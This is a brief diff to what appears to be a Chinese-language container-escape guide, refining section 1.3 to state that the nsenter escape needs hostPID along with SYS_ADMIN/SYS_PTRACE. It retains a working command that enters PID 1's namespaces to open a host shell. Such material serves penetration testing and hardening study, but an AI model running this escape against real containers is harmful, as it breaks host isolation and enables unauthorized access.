@@ -37,9 +37,9 @@ sleep 1
 cat /output
 ```
 
-### 1.3 nsenter 逃逸（需要 SYS_ADMIN/SYS_PTRACE）
+### 1.3 nsenter 逃逸（需要 hostPID + SYS_ADMIN/SYS_PTRACE）
 ```bash
-# 如果有 SYS_ADMIN capability
+# 只有在容器可见宿主机 PID namespace（如 hostPID: true）时，target 1 才通常指向宿主机 init
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
 ```
 
